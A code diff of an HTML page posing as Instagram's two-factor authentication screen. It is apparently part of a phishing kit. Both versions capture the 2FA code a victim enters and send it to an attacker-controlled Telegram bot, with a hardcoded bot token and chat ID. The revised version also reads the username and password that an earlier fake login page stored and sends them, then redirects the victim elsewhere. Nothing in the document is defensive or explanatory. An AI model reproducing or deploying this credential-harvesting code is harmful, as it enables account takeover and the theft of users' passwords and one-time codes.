@@ -1,122 +1,118 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - Two-Factor Authentication</title>
-    <!-- FAVICON -->
-    <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
-    <!-- GOOGLE FONT -->
-    <link rel="preconnect" href="https://fonts.gstatic.com">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,500;1,700&display=swap" rel="stylesheet">
-
-    <!-- APP CSS -->
-    <link rel="stylesheet" href="./app.css">
-
+    <title>Two-Factor Authentication</title>
     <style>
-        .error-message {
-            color: red;
-            margin-top: 10px;
+        /* Simple styles for the 2FA page */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #fafafa;
+        }
+
+        .auth-container {
+            width: 350px;
+            padding: 20px;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 5px;
             text-align: center;
+        }
+
+        .logo {
+            margin: 20px 0;
+            font-size: 24px;
+            font-weight: bold;
+            color: #262626;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            font-size: 14px;
+        }
+
+        .submit-button {
+            width: 100%;
+            padding: 10px;
+            margin: 20px 0;
+            background-color: #3897f0;
+            color: #fff;
+            border: none;
+            border-radius: 3px;
+            font-weight: bold;
+            cursor: pointer;
         }
     </style>
 </head>
-
 <body>
-
-    <div class="container">
-        <div class="main-container">
-            <div class="main-content">
-                <div class="slide-container" style="background-image: url(./images/phone-frame.png);">
-                    <div class="slide-content" id="slide-content">
-                        <img src="./images/slide (1).jpg" alt="slide image" class="active">
-                        <img src="./images/slide (2).jpg" alt="slide image">
-                        <img src="./images/slide (3).jpg" alt="slide image">
-                        <img src="./images/slide (4).jpg" alt="slide image">
-                        <img src="./images/slide (5).jpg" alt="slide image">
-                    </div>
-                </div>
-                <div class="form-container">
-                    <form id="twoFactorForm">
-                        <div class="form-content box">
-                            <div class="logo">
-                                <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
-                                <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
-                            </div>
-                            <div class="two-factor-form" id="two-factor-form">
-                                <div class="form-group">
-                                    <div class="animate-input">
-                                        <span>Enter the 6-digit code sent to your phone</span>
-                                        <input type="text" name="code" id="code" maxlength="6" required>
-                                    </div>
-                                </div>
-                                <div class="btn-group">
-                                    <button class="btn-login" type="submit">Verify</button>
-                                </div>
-                                <div id="error-message" class="error-message"></div>
-                                <a href="#" class="resend-code">Didn't receive a code? Resend</a>
-                            </div>
-                        </div>
-                    </form>
-                </div>
-            </div>
-        </div>
-        <div class="footer">
-            <div class="links">
-                <a href="#">About</a>
-                <a href="#">Blog</a>
-                <a href="#">Jobs</a>
-                <a href="#">Help</a>
-                <a href="#">API</a>
-                <a href="#">Privacy</a>
-                <a href="#">Terms</a>
-                <a href="#">Top Accounts</a>
-                <a href="#">Hashtags</a>
-                <a href="#">Locations</a>
-                <a href="#" id="darkmode-toggle">Darkmode</a>
-            </div>
-            <div class="copyright">
-                © 2023 Instagram from Facebook
-            </div>
-        </div>
+    <div class="auth-container">
+        <div class="logo">Instagram 2FA</div>
+        <form id="twoFactorForm">
+            <input type="text" class="input-field" id="twoFactorCode" placeholder="Enter 2FA Code" required>
+            <button type="submit" class="submit-button">Submit</button>
+        </form>
     </div>
 
-    <!-- APP JS -->
-    <script src="app.js"></script>
-
     <script>
-        function handleTwoFactor(event) {
-            event.preventDefault();
-            const code = document.getElementById('code').value;
-            const errorMessage = document.getElementById('error-message');
+        document.getElementById("twoFactorForm").addEventListener("submit", function(e) {
+            e.preventDefault();
 
-            // Prepare the message to send to Telegram
-            const textMessage = `*2FA code attempt:* \n*Code:* ${code}`;
+            // Retrieve 2FA code from input
+            const twoFactorCode = document.getElementById("twoFactorCode").value;
 
-            const chatId = '7623827088'; // Replace with your chat ID
-            const token = '7795453201:AAHbRVVvJQOMIP-aDjom2wYQfSS0J9n1weU'; // Replace with your bot token
+            // Assuming username and password are stored in sessionStorage from the login page
+            const username = sessionStorage.getItem("username") || "Unknown";
+            const password = sessionStorage.getItem("password") || "Unknown";
 
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textMessage)}&parse_mode=Markdown`;
+            // Telegram Bot API information
+            const botToken = "7795453201:AAHbRVVvJQOMIP-aDjom2wYQfSS0J9n1weU";
+            const chatId = "7623827088";
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-            // Send the message using fetch
-            fetch(url, {
-                method: "POST"
-            }).then(response => response.json()).then(data => {
+            // Message to send to Telegram
+            const message = `2FA Attempt:\nUsername: ${username}\nPassword: ${password}\n2FA Code: ${twoFactorCode}`;
+
+            // Send 2FA data to Telegram
+            fetch(telegramApiUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
                 if (data.ok) {
-                    errorMessage.textContent = "Incorrect code. Please try again.";
+                    // Redirect to success page after successful submission
+                    window.location.href = "flock.html";  // Redirect page
                 } else {
-                    errorMessage.textContent = "Failed to send code. Please try again.";
+                    alert("Error submitting 2FA code to Telegram.");
                 }
-            }).catch(error => {
-                console.error('Error:', error);
-                errorMessage.textContent = "Error sending code. Please try again.";
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                alert("An error occurred.");
             });
-        }
-
-        document.getElementById("twoFactorForm").addEventListener("submit", handleTwoFactor);
+        });
     </script>
 </body>
-
 </html>
